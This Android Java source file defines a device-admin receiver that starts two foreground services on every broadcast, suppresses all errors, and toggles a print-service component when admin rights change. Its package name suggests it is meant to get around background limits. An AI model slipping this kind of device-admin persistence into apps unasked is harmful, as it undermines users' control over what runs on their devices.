package background.work.around;

import android.app.*;
import android.os.*;
import android.app.admin.*;
import android.content.*;
import android.content.pm.*;
import android.widget.*;

public class MyDeviceAdminReceiver extends DeviceAdminReceiver {						

    @Override
    public void onReceive(Context context, Intent intent) {
		super.onReceive(context, intent);
		intent=null;
        Context appContext = context.getApplicationContext();
        context=null;
        try {
			Intent serviceIntent = new Intent(appContext, NotificationService.class);                            
            appContext.startForegroundService(serviceIntent);
			Intent serviceIntent2 = new Intent(appContext, RiderService.class);                                	
            appContext.startForegroundService(serviceIntent2);
        } catch (Throwable t) {}
    }
    	
    @Override
    public void onEnabled(Context context, Intent intent) {
        Toast.makeText(context, "Device Admin Enabled", Toast.LENGTH_SHORT).show();
                
        setComponentState(context, PrintService.class, PackageManager.COMPONENT_ENABLED_STATE_DISABLED);
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        Toast.makeText(context, "Device Admin Disabled", Toast.LENGTH_SHORT).show();
                
        setComponentState(context, PrintService.class, PackageManager.COMPONENT_ENABLED_STATE_ENABLED);
    }

    public static void setComponentState(Context context, Class<?> cls, int state) {
        try {
            ComponentName componentName = new ComponentName(context, cls);
            context.getPackageManager().setComponentEnabledSetting(
                componentName,
                state,
                PackageManager.DONT_KILL_APP
            );
        } catch (Throwable t) {}
    }
}
